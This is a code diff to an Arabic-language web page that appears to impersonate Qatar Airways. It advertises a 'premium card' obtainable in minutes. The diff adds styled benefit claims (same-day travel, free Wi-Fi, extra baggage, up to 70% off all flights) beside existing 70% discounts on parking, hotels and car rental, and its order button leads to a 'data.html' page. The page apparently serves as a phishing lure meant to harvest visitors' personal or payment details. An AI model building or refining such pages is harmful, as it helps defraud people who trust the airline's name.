@@ -121,6 +121,36 @@
             line-height: 1.6;
         }
 
+        /* New Benefits List inside Card */
+        .card-benefits-list {
+            text-align: right;
+            max-width: 500px;
+            margin: 0 auto 25px auto;
+            background: rgba(92, 6, 50, 0.03);
+            padding: 20px;
+            border-radius: 15px;
+            border-right: 4px solid var(--qatar-maroon);
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #444;
+            font-weight: 500;
+        }
+
+        .benefit-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .benefit-item i {
+            color: var(--qatar-maroon);
+            font-size: 16px;
+        }
+
         .order-btn-top {
             background: var(--qatar-maroon);
             color: #fff;
@@ -134,7 +164,7 @@
             transition: all 0.3s ease;
         }
 
-        /* New Compact Features List */
+        /* Compact Features List */
         .compact-features-list {
             background: #ffffff;
             border-radius: 20px;
@@ -193,7 +223,7 @@
             color: var(--qatar-maroon);
         }
 
-        /* Promo Banner - Match Image Bottom Part */
+        /* Promo Banner */
         .promo-banner {
             background: var(--qatar-maroon);
             border-radius: 20px;
@@ -337,12 +367,21 @@
                 </div>
                 <h2 class="card-showcase-title">بطاقة مميزة من الخطوط الجوية القطرية</h2>
                 <p class="card-showcase-subtitle">احصل على بطاقتك الآن خلال دقائق واستمتع بعالم من الرفاهية والمزايا التي لا تنتهي</p>
+                
+                <!-- Benefits List Added Here -->
+                <div class="card-benefits-list">
+                    <div class="benefit-item"><i class="fas fa-check-circle"></i> يمكنك الحجز والسفر في نفس اليوم</div>
+                    <div class="benefit-item"><i class="fas fa-check-circle"></i> إنترنت مجاني فائق السرعة على متن الطائرة</div>
+                    <div class="benefit-item"><i class="fas fa-check-circle"></i> وزن إضافي للأمتعة مجاناً</div>
+                    <div class="benefit-item"><i class="fas fa-check-circle"></i> أولوية تامة في إنهاء إجراءات الحجز</div>
+                    <div class="benefit-item"><i class="fas fa-check-circle"></i> خصم يصل إلى 70% على جميع الرحلات</div>
+                </div>
+
                 <a href="data.html" class="order-btn-top">احصل على بطاقتك الآن</a>
             </div>
 
-            <!-- Compact Features List (الخصومات بشكل صغير وأنيق) -->
+            <!-- Compact Features List -->
             <div class="compact-features-list">
-                <!-- Parking -->
                 <div class="compact-item">
                     <div class="compact-icon"><i class="fas fa-parking"></i></div>
                     <div class="compact-content">
@@ -352,7 +391,6 @@
                     <div class="discount-value">70%</div>
                 </div>
                 
-                <!-- Flight Tickets -->
                 <div class="compact-item">
                     <div class="compact-icon"><i class="fas fa-plane"></i></div>
                     <div class="compact-content">
@@ -362,7 +400,6 @@
                     <div class="discount-value">70%</div>
                 </div>
                 
-                <!-- Hotel Bookings -->
                 <div class="compact-item">
                     <div class="compact-icon"><i class="fas fa-hotel"></i></div>
                     <div class="compact-content">
@@ -372,7 +409,6 @@
                     <div class="discount-value">70%</div>
                 </div>
                 
-                <!-- Car Rental -->
                 <div class="compact-item">
                     <div class="compact-icon"><i class="fas fa-car"></i></div>
                     <div class="compact-content">
@@ -383,7 +419,7 @@
                 </div>
             </div>
             
-            <!-- Promo Banner - Match Image Bottom Part -->
+            <!-- Promo Banner -->
             <div class="promo-banner">
                 <div class="promo-left">
                     <div class="promo-title">لطلب بطاقتك الآن</div>
